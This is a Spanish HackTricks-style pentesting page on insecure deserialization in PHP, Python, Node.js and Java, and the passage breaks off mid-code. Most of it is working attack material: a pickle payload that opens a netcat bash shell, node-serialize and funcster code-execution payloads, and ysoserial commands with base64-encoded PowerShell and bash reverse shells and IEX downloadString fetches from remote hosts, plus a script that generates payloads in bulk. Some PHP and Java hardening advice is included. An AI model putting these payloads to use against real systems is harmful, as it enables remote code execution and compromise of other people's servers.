# Deserialización

{{#include ../../banners/hacktricks-training.md}}

## Información básica

**Serialización** se entiende como el método de convertir un objeto en un formato que puede ser preservado, con la intención de almacenar el objeto o transmitirlo como parte de un proceso de comunicación. Esta técnica se emplea comúnmente para asegurar que el objeto pueda ser recreado más tarde, manteniendo su estructura y estado.

**Deserialización**, por el contrario, es el proceso que contrarresta la serialización. Consiste en tomar datos que han sido estructurados en un formato específico y reconstruirlos de nuevo en un objeto.

La deserialización puede ser peligrosa porque potencialmente **permite a los atacantes manipular los datos serializados para ejecutar código malicioso** o provocar comportamientos inesperados en la aplicación durante el proceso de reconstrucción del objeto.

## PHP

En PHP, se utilizan métodos mágicos específicos durante los procesos de serialización y deserialización:

- `__sleep`: Invocado cuando un objeto está siendo serializado. Este método debe devolver un array con los nombres de todas las propiedades del objeto que deben ser serializadas. Se usa comúnmente para confirmar datos pendientes o realizar tareas de limpieza similares.
- `__wakeup`: Llamado cuando un objeto está siendo deserializado. Se utiliza para restablecer las conexiones a la base de datos que puedan haberse perdido durante la serialización y para realizar otras tareas de re-inicialización.
- `__unserialize`: Este método se llama en lugar de `__wakeup` (si existe) cuando un objeto está siendo deserializado. Ofrece mayor control sobre el proceso de deserialización en comparación con `__wakeup`.
- `__destruct`: Este método se llama cuando un objeto está a punto de ser destruido o cuando termina el script. Normalmente se utiliza para tareas de limpieza, como cerrar manejadores de archivos o conexiones a la base de datos.
- `__toString`: Este método permite que un objeto sea tratado como una cadena. Puede usarse para leer un archivo u otras tareas basadas en las llamadas a funciones dentro de él, proporcionando efectivamente una representación textual del objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si miras los resultados puedes ver que las funciones **`__wakeup`** y **`__destruct`** se llaman cuando el objeto es deserializado. Observa que en varios tutoriales encontrarás que la función **`__toString`** se llama al intentar imprimir algún atributo, pero aparentemente eso **ya no ocurre**.

> [!WARNING]
> El método **`__unserialize(array $data)`** se llama **en lugar de `__wakeup()`** si está implementado en la clase. Permite unserializar el objeto proporcionando los datos serializados como un array. Puedes usar este método para unserializar propiedades y realizar las tareas necesarias al deserializar.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

You can read an explained **PHP example here**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), here [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) or here [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserialización + Autoload Classes

You could abuse the PHP autoload functionality to load arbitrary php files and more:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serializing Referenced Values

Si por alguna razón quieres serializar un valor como una **referencia a otro valor serializado** puedes:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Previniendo PHP Object Injection con `allowed_classes`

> [!INFO]
> El soporte para el **segundo argumento** de `unserialize()` (el array `$options`) se añadió en **PHP 7.0**. En versiones antiguas la función solo acepta la cadena serializada, lo que hace imposible restringir qué clases pueden ser instanciadas.

`unserialize()` instanciará **todas las clases** que encuentre dentro de la cadena serializada a menos que se indique lo contrario. Desde PHP 7 el comportamiento puede restringirse con la opción [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Si **`allowed_classes` se omite _o_ el código se ejecuta en PHP < 7.0**, la llamada se vuelve **peligrosa** ya que un atacante puede crear un payload que abuse de métodos mágicos como `__wakeup()` o `__destruct()` para lograr Remote Code Execution (RCE).

#### Ejemplo real: Everest Forms (WordPress) CVE-2025-52709

El plugin de WordPress **Everest Forms ≤ 3.2.2** intentó ser defensivo con un helper wrapper pero olvidó las versiones antiguas de PHP:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
En servidores que aún ejecutaban **PHP ≤ 7.0**, esta segunda rama conducía a una clásica **PHP Object Injection** cuando un administrador abría un envío de formulario malicioso. Un exploit payload mínimo podría verse así:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Tan pronto como el admin visualizó la entrada, el objeto fue instanciado y `SomeClass::__destruct()` se ejecutó, resultando en ejecución de código arbitrario.

**Puntos clave**
1. Siempre pasa `['allowed_classes' => false]` (o una lista blanca estricta) al llamar a `unserialize()`.
2. Audita los wrappers defensivos – a menudo olvidan las ramas antiguas de PHP.
3. Actualizar a **PHP ≥ 7.x** por sí solo *no* es suficiente: la opción todavía debe ser suministrada explícitamente.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) puede ayudarte a generar payloads para abusar de PHP deserializations.\
Ten en cuenta que en varios casos **no podrás encontrar una forma de abusar de una deserialization en el código fuente** de la aplicación, pero podrías ser capaz de **abusar del código de extensiones PHP externas.**\
Así que, si puedes, revisa el `phpinfo()` del servidor y **busca en internet** (e incluso en los **gadgets** de **PHPGGC**) algún gadget posible que puedas abusar.

### phar:// metadata deserialization

Si has encontrado un LFI que solo está leyendo el archivo y no ejecutando el php dentro de él, por ejemplo usando funciones como _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**.** Puedes intentar abusar de una **deserialization** que ocurre al **leer** un **archivo** usando el protocolo **phar**.\
Para más información lee el siguiente post:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Cuando el objeto es unpickled, la función \_\_\_reduce\_\_\_ se ejecutará.\
Cuando se explote, el servidor podría devolver un error.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Antes de comprobar la bypass technique, prueba a usar `print(base64.b64encode(pickle.dumps(P(),2)))` para generar un objeto compatible con python2 si estás ejecutando python3.

Para más información sobre cómo escapar de **pickle jails** consulta:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

La página siguiente presenta la técnica para **abusar de una deserialización insegura en las librerías yaml de python** y termina con una herramienta que puede usarse para generar payloads de deserialización RCE para **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **no tiene funciones "mágicas"** como PHP o Python que se ejecuten solo por crear un objeto. Pero tiene algunas **funciones** que se **usan frecuentemente incluso sin llamarlas directamente**, como **`toString`**, **`valueOf`**, **`toJSON`**. Si se abusa de una deserialización, puedes **comprometer estas funciones para ejecutar otro código** (potencialmente abusando de prototype pollutions) y podrías ejecutar código arbitrario cuando se les llame.

Otra **"magic" way to call a function** sin llamarla directamente es **comprometiendo un objeto que es devuelto por una función async** (promise). Porque, si **transformas** ese **objeto de retorno** en otra **promise** con una **propiedad** llamada **"then" of type function**, se **ejecutará** simplemente porque es devuelto por otra promise. _Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Si quieres aprender sobre esta técnica **echa un vistazo al siguiente tutorial**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta librería permite serializar funciones. Ejemplo:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
El **objeto serializado** se verá así:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Puedes ver en el ejemplo que cuando una función se serializa la bandera `_$$ND_FUNC$$_` se añade al objeto serializado.

Inside the file `node-serialize/lib/serialize.js` you can find the same flag and how the code is using it.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Como puedes ver en el último fragmento de código, **si se encuentra la bandera** se usa `eval` para deserializar la función, por lo que básicamente **user input está siendo usado dentro de la función `eval`**.

Sin embargo, **solo serializar** una función **no la ejecutará** ya que sería necesario que alguna parte del código **llamara a `y.rce`** en nuestro ejemplo y eso es muy **poco probable**.\
De todas formas, podrías simplemente **modificar el objeto serializado** **añadiendo algunos paréntesis** para que la función serializada se ejecute automáticamente cuando el objeto sea deserializado.\
En el siguiente fragmento de código **fíjate en el último paréntesis** y en cómo la función `unserialize` ejecutará automáticamente el código:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Como se indicó anteriormente, esta librería obtendrá el código después de `_$$ND_FUNC$$_` y lo **ejecutará** usando `eval`. Por lo tanto, para **auto-ejecutar código** puedes **eliminar la parte de creación de la función** y el último paréntesis y **simplemente ejecutar un JS oneliner** como en el siguiente ejemplo:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Puedes [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **más información** sobre cómo explotar esta vulnerabilidad.

### [funcster](https://www.npmjs.com/package/funcster)

Un aspecto notable de **funcster** es la inaccesibilidad de los **objetos integrados estándar**; estos quedan fuera del ámbito accesible. Esta restricción impide la ejecución de código que intente invocar métodos en objetos integrados, provocando excepciones como `"ReferenceError: console is not defined"` cuando se usan comandos como `console.log()` o `require(something)`.

A pesar de esta limitación, es posible restaurar el acceso completo al contexto global, incluidos todos los objetos integrados estándar, mediante un enfoque específico. Aprovechando directamente el contexto global, se puede eludir esta restricción. Por ejemplo, el acceso puede restablecerse usando el siguiente fragmento:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Para**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

El paquete **serialize-javascript** está diseñado exclusivamente para propósitos de serialización, sin capacidades de deserialización integradas. Los usuarios son responsables de implementar su propio método de deserialización. El uso directo de `eval` es sugerido por el ejemplo oficial para deserializar datos serializados:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Si esta función se usa para deserialize objects, puedes **explotarla fácilmente**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Para**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

En las siguientes páginas puedes encontrar información sobre cómo abusar de esta library para ejecutar comandos arbitrarios:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

En Java, **los callbacks de deserialización se ejecutan durante el proceso de deserialización**. Esta ejecución puede ser explotada por atacantes que construyan payloads maliciosos que disparen estos callbacks, conduciendo a la posible ejecución de acciones dañinas.

### Fingerprints

#### White Box

Para identificar posibles vulnerabilidades de serialización en la base de código busca:

- Clases que implementen la interfaz `Serializable`.
- Uso de `java.io.ObjectInputStream`, funciones `readObject`, `readUnshare`.

Presta especial atención a:

- `XMLDecoder` utilizado con parámetros definidos por usuarios externos.
- El método `fromXML` de `XStream`, especialmente si la versión de XStream es menor o igual a 1.46, ya que es susceptible a problemas de serialización.
- `ObjectInputStream` junto con el método `readObject`.
- Implementación de métodos como `readObject`, `readObjectNodData`, `readResolve` o `readExternal`.
- `ObjectInputStream.readUnshared`.
- Uso general de `Serializable`.

#### Black Box

Para testing Black Box, busca **firmas o "Magic Bytes"** específicos que denoten objetos serializados de java (originados por `ObjectInputStream`):

- Patrón hexadecimal: `AC ED 00 05`.
- Patrón Base64: `rO0`.
- Encabezados de respuesta HTTP con `Content-type` establecido en `application/x-java-serialized-object`.
- Patrón hexadecimal que indica compresión previa: `1F 8B 08 00`.
- Patrón Base64 que indica compresión previa: `H4sIA`.
- Archivos web con la extensión `.faces` y el parámetro `faces.ViewState`. Encontrar estos patrones en una aplicación web debería provocar un examen como el detallado en el [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Comprobar si es vulnerable

Si quieres **aprender cómo funciona un exploit de Java Deserialization** deberías echar un vistazo a [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), y [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization and pre-auth reachability

Las codebases modernas a veces envuelven la deserialización con `java.security.SignedObject` y validan una firma antes de invocar `getObject()` (que deserializa el objeto interno). Esto impide clases gadget arbitrarias a nivel superior, pero aún puede ser explotable si un atacante puede obtener una firma válida (p. ej., compromiso de la clave privada o un signing oracle). Además, los flujos de manejo de errores pueden acuñar tokens vinculados a la sesión para usuarios no autenticados, exponiendo sinks protegidos antes de la autenticación.

Para un caso de estudio concreto con requests, IoCs y orientación de hardening, consulta:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### Prueba de caja blanca

Puedes comprobar si hay instalada alguna aplicación con vulnerabilidades conocidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Puedes intentar **comprobar todas las librerías** conocidas por ser vulnerables y para las que [**Ysoserial** ](https://github.com/frohoff/ysoserial) puede proporcionar un exploit. O puedes revisar las librerías indicadas en [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
También puedes usar [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para buscar posibles gadget chains que puedan explotarse.\
Al ejecutar **gadgetinspector** (tras compilarlo) no te preocupes por la gran cantidad de advertencias/errores que muestra y déjalo terminar. Escribirá todos los hallazgos en _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Ten en cuenta que **gadgetinspector no creará un exploit y puede indicar falsos positivos**.

#### Black Box Test

Usando la extensión de Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) puedes identificar **qué librerías están disponibles** (e incluso las versiones). Con esta información podría ser **más fácil elegir un payload** para explotar la vulnerabilidad.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe está enfocado en las deserializaciones de **`ObjectInputStream`**.

Usando la extensión de Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) puedes **identificar librerías vulnerables** explotables con ysoserial y **explotarlas**.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner está enfocado en deserializaciones **`ObjectInputStream`**.

También puedes usar [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades de deserialización** en **Burp**. Este plugin detectará **no solo vulnerabilidades relacionadas con `ObjectInputStream`**, sino también vulnerabilidades de librerías de deserialización **Json** y **Yml**. En modo activo, intentará confirmarlas usando payloads de sleep o DNS.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

No todo consiste en comprobar si el servidor usa alguna librería vulnerable. A veces puedes **modificar los datos dentro del objeto serializado y eludir algunas comprobaciones** (quizá conseguir privilegios de admin dentro de una webapp).\
Si encuentras un objeto java serializado siendo enviado a una aplicación web, **puedes usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir de forma más legible el objeto serializado que se envía**. Saber qué datos estás enviando facilita modificarlos y eludir algunas comprobaciones.

### **Exploit**

#### **ysoserial**

La herramienta principal para explotar deserializaciones Java es [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). También puedes considerar usar [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) que te permitirá usar comandos complejos (con pipes, por ejemplo).\
Ten en cuenta que esta herramienta está **enfocada** en explotar deserializaciones **`ObjectInputStream`**.\
Yo **empezaría usando el payload "URLDNS"** antes de un payload RCE para probar si la inyección es posible. De todos modos, ten en cuenta que quizá el payload "URLDNS" no funcione pero otro payload RCE sí.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Al crear un payload para **java.lang.Runtime.exec()** no puedes usar caracteres especiales como ">" o "|" para redirigir la salida de una ejecución, "$()" para ejecutar comandos o incluso **pasar argumentos** a un comando separados por **espacios** (puedes hacer `echo -n "hello world"` pero no puedes hacer `python2 -c 'print "Hello world"'`). Para codificar correctamente el payload puedes [usar esta página](http://www.jackson-t.ca/runtime-exec-payloads.html).

Siéntete libre de usar el siguiente script para crear **todos los posibles payloads de code execution** para Windows y Linux y luego probarlos en la página web vulnerable:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Puedes **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto con ysoserial para crear más exploits**. Más información sobre esta herramienta en las **diapositivas de la charla** donde se presentó: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) puede usarse para generar payloads para exploit diferentes librerías de serialización **Json** y **Yml** en Java.\
Para compilar el proyecto necesité **añadir** estas **dependencias** a `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instala maven** y **compila** el proyecto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lee más sobre esta biblioteca Java para JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratorios

- Si quieres probar algunos payloads de ysoserial puedes **ejecutar esta webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por qué

Java usa ampliamente la serialización para varios propósitos como:

- **HTTP requests**: La serialización se emplea ampliamente en la gestión de parámetros, ViewState, cookies, etc.
- **RMI (Remote Method Invocation)**: El protocolo Java RMI, que depende completamente de la serialización, es fundamental para la comunicación remota en aplicaciones Java.
- **RMI over HTTP**: Este método se usa comúnmente en aplicaciones web con thick client basadas en Java, utilizando serialización para todas las comunicaciones de objetos.
- **JMX (Java Management Extensions)**: JMX utiliza la serialización para transmitir objetos a través de la red.
- **Custom Protocols**: En Java, la práctica habitual implica la transmisión de objetos Java en bruto, lo cual se demostrará en ejemplos de exploit a continuación.

### Prevención

#### Objetos transient

Una clase que implementa `Serializable` puede declarar como `transient` cualquier objeto dentro de la clase que no deba ser serializado. Por ejemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evitar la serialización de una clase que necesita implementar Serializable

En escenarios donde ciertos **objetos deben implementar la interfaz `Serializable`** debido a la jerarquía de clases, existe el riesgo de deserialización no intencionada. Para evitar esto, asegúrate de que estos objetos no sean deserializables definiendo un método `final` `readObject()` que lance siempre una excepción, como se muestra a continuación:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Mejorando la seguridad de la deserialización en Java**

**Personalizar `java.io.ObjectInputStream`** es un enfoque práctico para proteger los procesos de deserialización. Este método es adecuado cuando:

- El código de deserialización está bajo su control.
- Se conocen las clases esperadas para la deserialización.

Sobrescriba el método **`resolveClass()`** para limitar la deserialización únicamente a clases permitidas. Esto evita la deserialización de cualquier clase excepto las expresamente permitidas, como en el siguiente ejemplo que restringe la deserialización únicamente a la clase `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
